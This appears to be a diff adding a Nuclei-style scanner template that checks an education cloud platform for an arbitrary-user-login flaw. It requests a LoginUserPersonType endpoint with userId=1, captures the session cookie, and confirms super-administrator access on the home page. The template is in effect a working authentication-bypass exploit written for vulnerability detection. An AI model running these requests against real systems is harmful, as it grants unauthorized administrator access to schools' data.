@@ -1,0 +1,49 @@
+id: cloud-platform-loginuserpersontype-anyuser-login
+
+info:
+  name: 东师理想智慧教育云平台 LoginUserPersonType 任意用户登录漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 权限绕过
+  description: |
+    This template checks for an arbitrary user login vulnerability in the 东师理想智慧教育云平台. It verifies the ability to log in as a super administrator using crafted requests.
+
+http:
+  - id: initial-login
+    method: GET
+    path:
+      - "{{BaseURL}}/Account/LoginUserPersonType?userId=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"success":true}'
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        internal: true
+        regex:
+          - ".AspNet.UCApplicationCookie(?P<cookie>.*?);"
+
+  - id: verify-access
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Cookie: .AspNet.UCApplicationCookie{{cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "超级管理员"
+          - "用户中心"
+          - "注销"
